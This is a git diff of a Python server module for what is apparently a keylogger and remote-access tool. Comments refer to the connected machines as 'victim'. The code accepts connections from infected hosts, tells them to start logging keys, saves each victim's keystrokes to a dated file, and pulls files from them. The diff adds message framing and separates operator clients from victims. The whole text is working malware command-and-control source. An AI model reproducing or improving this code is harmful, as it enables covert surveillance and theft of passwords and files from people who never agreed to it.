@@ -5,6 +5,7 @@ import threading
 from Tkinter import END, NORMAL
 import db
 import Connection
+import struct
 
 class Server:
     """
@@ -16,13 +17,7 @@ class Server:
         4. Handle DB operations
     """
 
-    def __init__(self, client):
-        """
-        takes a client object created in run.py
-        :param client:
-        """
-        global cli
-        cli = client
+    def __init__(self):
         return
 
     def getIP(f):
@@ -60,8 +55,9 @@ class Server:
             except:
                 ip = nc.ip
                 hostname = nc.hostname
-                Server.updateTextbox(str(ip[0]) + "@ " + hostname + " has disconnected...\n")
+                Server.updateTextbox(hostname + "@ " + str(ip[0]) + " has disconnected...\n")
                 return
+
 
     @staticmethod
     def trimMessage(m):
@@ -82,15 +78,20 @@ class Server:
         while (True):
             global s
             c, addr = Server.s.accept()
-            hostname = Server.trimMessage(c.recv(256))
-            nc = Connection.Connection(addr, hostname, c)
-            Server.DB.insert(nc)
-            Server.updateTextbox(str(nc.hostname) + "@ " + str(nc.ip[0]) + " has connected..." +"\n")
-            cli.connections.append(str(nc.ip[0]) + " - " + str(nc.hostname))
-            cli.redrawClientMenu()
-            t = threading.Thread(target=Server.newConn, args=[nc])
-            t.setDaemon(True)
-            t.start()
+            hostname = Server.trimMessage(Server.recvMsg(c))
+            uniq = Server.trimMessage(Server.recvMsg(c))
+            print(uniq)
+            if(uniq == "-1"):
+                c.send("Welcome to the server...\n")
+                #client connected, not victim
+            else:
+                nc = Connection.Connection(uniq ,addr, hostname, c)
+                Server.updateTextbox(str(nc.hostname) + "@ " + str(nc.ip[0]) + " has connected..." +"\n")
+                #cli.connections.append(str(nc.unique) + " - "+str(nc.ip[0]) + " - " + str(nc.hostname))
+                #cli.redrawClientMenu()
+                t = threading.Thread(target=Server.newConn, args=[nc])
+                t.setDaemon(True)
+                t.start()
 
     @staticmethod
     def updateTextbox(s):
@@ -99,38 +100,43 @@ class Server:
         :param s: string
         :return:
         """
-        cli.text.config(state=NORMAL)
-        cli.text.insert(END, s)
+        print(s)
+        #cli.text.config(state=NORMAL)
+        #cli.text.insert(END, s)
 
+    @staticmethod
     def keyLog(conn):
-        conn.socket.sendall("log")
+        sock = socket.socket(conn.socket)
+        sock.sendall("log")
         Server.recvKeyLogs(conn)
 
-
+    @staticmethod
     def recvKeyLogs(conn):
         """
         keys pressed by victim are handled by this function
         they are logged in a text file
         """
-        host = Server.DB.findBySock(conn.socket)
+        host = conn.hostname
         date = str(datetime.date.today())
-        f = open(date+'_keys.txt', 'w')
+        f = open(host+"_"+date+'_keys.txt', 'w')
         while (True):
-            key = socket.recv(512)
+            sock = socket.socket(conn.socket)
+            key = sock.recv(512)
             f.write(key)
             print(key[0][0])
 
     #need to make this handle Connection objects and no list
-    def whatDo(cmd):
+    def whatDo(self, cmd):
         """
         handles command from client.py
         decides what command the user wants to execute
         """
-        conn = Server.DB.getConnectionHostIP(cmd[0].ip, cmd[0].hostname)
         if (cmd[1] == "log"):
-            Server.keyLog(conn)
+            Server.keyLog(cmd[0])
+        elif("keylog" == cmd[1]):
+            Server.keyLog(cmd[0])
         elif ("download" in cmd[1]):
-            Server.downloadFile(conn)
+            Server.downloadFile(cmd[0])
 
 
     def downloadFile(sock):
@@ -145,8 +151,24 @@ class Server:
             print(line)
             f.write(line)
 
+    @staticmethod
+    def sendMsg(sock, m):
+        m = struct.pack('>I', len(m)) + m
+        sock.sendall(m)
+
+    @staticmethod
+    def recvMsg(sock):
+        rawMsgLen = Server.recvall(sock, 4)
+        msgLen = struct.unpack('>I', rawMsgLen)[0]
+        return Server.recvall(sock, msgLen)
+
+    @staticmethod
+    def recvall(sock, n):
+        data = ''
+        while len(data) < n:
+            packet = sock.recv(n-len(data))
+            data += packet
+        return data
 
     def startServer(self):
-        t = threading.Thread(target=Server.waitForConns)
-        t.setDaemon(True)
-        t.start()
+        Server.waitForConns()
